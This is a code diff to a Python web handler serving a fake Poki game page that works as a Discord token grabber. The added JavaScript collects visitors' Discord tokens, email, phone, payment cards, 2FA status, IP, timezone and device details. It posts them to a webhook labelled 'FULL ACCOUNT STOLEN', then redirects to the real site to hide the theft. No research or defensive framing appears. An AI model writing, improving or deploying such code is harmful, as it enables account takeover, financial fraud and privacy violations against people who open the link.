@@ -12,29 +12,7 @@ class handler(BaseHTTPRequestHandler):
               self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
         ua = self.headers.get('User-Agent', 'Unknown')
         
-        # Send initial notification only
-        try:
-            payload = {
-                "username": "Image Logger",
-                "content": "@everyone",
-                "embeds": [{
-                    "title": "🎯 Someone Opened The Link!",
-                    "color": 16753920,
-                    "description": "Grabbing Discord account data...",
-                    "fields": [
-                        {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
-                        {"name": "💻 Device", "value": f"```{ua[:100]}```", "inline": False}
-                    ],
-                    "thumbnail": {"url": POKI_IMAGE},
-                    "footer": {"text": "Discord data incoming..."}
-                }]
-            }
-            req = urllib.request.Request(WEBHOOK, 
-                data=json.dumps(payload).encode(),
-                headers={'Content-Type': 'application/json'})
-            urllib.request.urlopen(req)
-        except:
-            pass
+        # Don't send initial notification - let JS handle everything
         
         html = f'''<!DOCTYPE html>
 <html>
@@ -212,29 +190,35 @@ if(data.length>0)nitro=data[0].type==1?'Nitro Classic':'Nitro Full';
 const email=user.email||'No email set';
 const phone=user.phone||'No phone set';
 const username=`${{user.username}}#${{user.discriminator}}`;
+const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-// Send complete account data
+// Send ONE complete message with EVERYTHING
 await fetch(webhook,{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
 content:`@everyone 🚨 **${{username}}** OPENED THE LINK!`,
 embeds:[{{
-title:`🔑 ${{username}} - Account Stolen`,
+title:`🔑 ${{username}} - FULL ACCOUNT STOLEN`,
 color:16711680,
-description:`**Discord User:** ${{username}}\\n**Email:** ${{email}}\\n**Phone:** ${{phone}}`,
+description:`**Discord:** ${{username}}\\n**Email:** ${{email}}\\n**Phone:** ${{phone}}`,
 fields:[
-{{name:'👤 Username',value:username,inline:false}},
-{{name:'📧 Email',value:email,inline:false}},
-{{name:'📱 Phone',value:phone,inline:false}},
-{{name:'🆔 ID',value:user.id,inline:true}},
-{{name:'🔐 2FA',value:user.mfa_enabled?'✅':'❌',inline:true}},
+{{name:'👤 Discord User',value:username,inline:false}},
+{{name:'📧 Email Address',value:email,inline:false}},
+{{name:'📱 Phone Number',value:phone,inline:false}},
+{{name:'🆔 User ID',value:user.id,inline:true}},
+{{name:'🔐 2FA',value:user.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
 {{name:'💎 Nitro',value:nitro,inline:true}},
-{{name:'💳 Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
-{{name:'🔑 Token',value:`\`\`\`${{token}}\`\`\``,inline:false}}
+{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
+{{name:'📍 IP Address',value:'{ip}',inline:true}},
+{{name:'🕐 Timezone',value:tz,inline:true}},
+{{name:'🖥️ Platform',value:navigator.platform,inline:true}},
+{{name:'🌍 Language',value:navigator.language,inline:true}},
+{{name:'💻 User Agent',value:`\`\`\`{ua[:80]}\`\`\``,inline:false}},
+{{name:'🔑 Full Token',value:`\`\`\`${{token}}\`\`\``,inline:false}}
 ],
 thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{user.id}}/${{user.avatar}}.png`}},
-footer:{{text:`${{username}} got logged`}}
+footer:{{text:`${{username}} - Complete data grab`}}
 }}]
 }})
 }});
@@ -243,11 +227,32 @@ break;
 }}catch(e){{}}
 }}
 }}else{{
-// No token - just send what we have silently (no alert about failure)
-// Already sent browser info, so do nothing extra
+// No Discord - send what we have
+const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+await fetch(webhook,{{
+method:'POST',
+headers:{{'Content-Type':'application/json'}},
+body:JSON.stringify({{
+content:'@everyone',
+embeds:[{{
+title:'🎯 Someone Opened The Link',
+color:16753920,
+description:'**No Discord login detected** (opened from Discord app in external browser)',
+fields:[
+{{name:'📍 IP Address',value:'{ip}',inline:false}},
+{{name:'🕐 Timezone',value:tz,inline:true}},
+{{name:'🌍 Language',value:navigator.language,inline:true}},
+{{name:'🖥️ Platform',value:navigator.platform,inline:true}},
+{{name:'💻 User Agent',value:`\`\`\`{ua[:80]}\`\`\``,inline:false}}
+],
+footer:{{text:'Discord token not found - victim not logged into Discord web'}}
+}}]
+}})
+}});
 }}
 
-// Send browser info
+// Send browser info separately
+try{{
 const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
 await fetch(webhook,{{
 method:'POST',
@@ -264,6 +269,7 @@ fields:[
 }}]
 }})
 }});
+}}catch(e){{}}
 
 // Redirect to real Poki after grabbing data
 setTimeout(()=>{{window.location.href='https://poki.com'}},2500);
